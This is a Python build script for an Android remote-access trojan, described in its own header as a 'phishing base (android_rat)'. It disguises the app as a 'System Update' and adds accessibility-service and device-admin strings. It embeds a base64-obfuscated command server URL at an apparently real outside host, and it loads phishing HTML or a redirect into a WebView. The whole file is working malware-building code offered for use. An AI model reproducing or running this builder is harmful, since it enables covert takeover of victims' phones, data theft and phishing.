#!/usr/bin/env python3
"""Inject into full phishing base (android_rat)."""
import os, re, base64, sys

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
ANDROID = os.path.join(ROOT, "android")
MAIN_KT = os.path.join(ANDROID, "app/src/main/java/com/sync/xxx/MainActivity.kt")
DEVICE_KT = os.path.join(ANDROID, "app/src/main/java/com/sync/xxx/DeviceService.kt")
STRINGS = os.path.join(ANDROID, "app/src/main/res/values/strings.xml")
APP_GRADLE = os.path.join(ANDROID, "app/build.gradle")
MANIFEST = os.path.join(ANDROID, "app/src/main/AndroidManifest.xml")

APP_NAME = (os.environ.get("APP_NAME") or "System Update").strip()[:48] or "System Update"
APP_ID = (os.environ.get("APP_ID") or "com.sync.xxx").strip() or "com.sync.xxx"
RAT_TYPE = (os.environ.get("RAT_TYPE") or "ALL").strip().upper()
REDIRECT_MODE = (os.environ.get("REDIRECT_MODE") or "URL").strip().upper()
REDIRECT_VALUE = (os.environ.get("REDIRECT_VALUE") or "").strip()
SERVER_URL = (os.environ.get("SERVER_URL") or "http://papsky.queen-official.com:2468").strip()
PAIR_ID = (os.environ.get("PAIR_ID") or "NEONXJZET0000").strip()
VERSION_NAME = (os.environ.get("VERSION_NAME") or "1.0").strip()
VERSION_CODE = (os.environ.get("VERSION_CODE") or "1").strip()
ICON_B64 = (os.environ.get("ICON_BASE64") or os.environ.get("ICON_B64") or "").strip()

def xml_escape(s):
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")

print("[inject] name=%r mode=%s rat=%s pair=%s" % (APP_NAME, REDIRECT_MODE, RAT_TYPE, PAIR_ID))

# pair
uid = os.path.join(ANDROID, "app/src/main/assets/uid.json")
os.makedirs(os.path.dirname(uid), exist_ok=True)
open(uid, "w", encoding="utf-8").write('{"uid":"%s","pair":"%s","auto":true}\n' % (PAIR_ID, PAIR_ID))

# strings app_name + required
if os.path.isfile(STRINGS):
    s = open(STRINGS, encoding="utf-8", errors="ignore").read()
    safe = xml_escape(APP_NAME)
    if 'name="app_name"' in s:
        s = re.sub(r'<string\s+name="app_name">[^<]*</string>', '<string name="app_name">%s</string>' % safe, s, count=1)
    else:
        s = s.replace("</resources>", '    <string name="app_name">%s</string>\n</resources>' % safe)
    for name, val in (
        ("accessibility_desc", "System accessibility service"),
        ("device_admin_description", "Device admin"),
    ):
        if 'name="%s"' % name not in s:
            s = s.replace("</resources>", '    <string name="%s">%s</string>\n</resources>' % (name, val))
    open(STRINGS, "w", encoding="utf-8").write(s)
    print("[inject] app_name =", APP_NAME)

# applicationId
if os.path.isfile(APP_GRADLE):
    g = open(APP_GRADLE, encoding="utf-8", errors="ignore").read()
    g = re.sub(r'applicationId\s+"[^"]*"', 'applicationId "%s"' % APP_ID, g, count=1)
    vc = re.sub(r"\D", "", VERSION_CODE) or "1"
    g = re.sub(r"versionCode\s+\d+", "versionCode %s" % vc, g, count=1)
    g = re.sub(r'versionName\s+"[^"]*"', 'versionName "%s"' % VERSION_NAME.replace('"', ""), g, count=1)
    open(APP_GRADLE, "w", encoding="utf-8").write(g)

# SERVER in DeviceService
if os.path.isfile(DEVICE_KT):
    src = open(DEVICE_KT, encoding="utf-8", errors="ignore").read()
    b64 = base64.b64encode(SERVER_URL.encode()).decode("ascii")
    src2, n = re.subn(r'(Base64\.decode\(\s*")[^"]*(")', r"\1%s\2" % b64, src, count=1)
    if n == 0:
        src2, n = re.subn(
            r'(val SERVER_URL[^\n]*=[^\n]*")[^"]*(")',
            r"\1%s\2" % SERVER_URL.replace("\\", "\\\\").replace('"', '\\"'),
            src, count=1,
        )
    if n:
        open(DEVICE_KT, "w", encoding="utf-8").write(src2)
        print("[inject] SERVER_URL OK")
    else:
        print("[warn] SERVER_URL pattern not found")

# MainActivity content
empty = (not REDIRECT_VALUE) or REDIRECT_VALUE in (
    "https://example.com", "http://example.com", "example.com",
)
if os.path.isfile(MAIN_KT):
    m = open(MAIN_KT, encoding="utf-8", errors="ignore").read()
    if REDIRECT_MODE == "HTML" and REDIRECT_VALUE and not empty:
        raw = REDIRECT_VALUE
        if "<html" not in raw.lower():
            raw = "<!DOCTYPE html><html><body>%s</body></html>" % raw
        # write asset and force loadDataWithBaseURL from file
        ap = os.path.join(ANDROID, "app/src/main/assets/phish.html.b64")
        os.makedirs(os.path.dirname(ap), exist_ok=True)
        open(ap, "w").write(base64.b64encode(raw.encode()).decode())
        repl = (
            'try { val b64 = assets.open("phish.html.b64").bufferedReader().readText(); '
            'val html = String(android.util.Base64.decode(b64, android.util.Base64.DEFAULT)); '
            'webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null) } '
            'catch (e: Exception) { webView.loadDataWithBaseURL(serverUrl, buildHtml(), "text/html", "UTF-8", null) }'
        )
        m2, n = re.subn(
            r"webView\.loadDataWithBaseURL\([^)]*\)",
            repl,
            m,
            count=1,
        )
        if n == 0:
            m2, n = re.subn(r"webView\.loadUrl\([^)]*\)", repl, m, count=1)
        print("[inject] HTML", n)
        m = m2 if n else m
    elif REDIRECT_MODE == "URL" and REDIRECT_VALUE and not empty:
        url = REDIRECT_VALUE
        if not url.startswith("http"):
            url = "https://" + url
        esc = url.replace("\\", "\\\\").replace('"', '\\"')
        m2, n = re.subn(
            r"webView\.loadDataWithBaseURL\([^)]*\)",
            'webView.loadUrl("%s")' % esc,
            m,
            count=1,
        )
        if n == 0:
            m2, n = re.subn(
                r"webView\.loadUrl\([^)]*\)",
                'webView.loadUrl("%s")' % esc,
                m,
                count=1,
            )
        print("[inject] URL", url, n)
        m = m2 if n else m
    else:
        # keep default buildHtml() / loadDataWithBaseURL — tampilan awal base
        print("[inject] content DEFAULT base UI")
    open(MAIN_KT, "w", encoding="utf-8").write(m)

# icon custom
if ICON_B64:
    try:
        import io
        from pathlib import Path as P
        from PIL import Image
        data = base64.b64decode(ICON_B64.split(",")[-1])
        im = Image.open(io.BytesIO(data)).convert("RGBA")
        w, h = im.size
        side = min(w, h)
        im = im.crop(((w - side) // 2, (h - side) // 2, (w + side) // 2, (h + side) // 2))
        res = P(ANDROID) / "app/src/main/res"
        for dens, size in (("mdpi", 48), ("hdpi", 72), ("xhdpi", 96), ("xxhdpi", 144), ("xxxhdpi", 192)):
            d = res / ("mipmap-%s" % dens)
            d.mkdir(parents=True, exist_ok=True)
            r = im.resize((size, size), Image.LANCZOS)
            r.save(str(d / "ic_launcher.png"), format="PNG")
            r.save(str(d / "ic_launcher_round.png"), format="PNG")
        print("[inject] icon CUSTOM")
    except Exception as e:
        print("[warn] icon", e)
else:
    print("[inject] icon DEFAULT")

print("[inject] done")
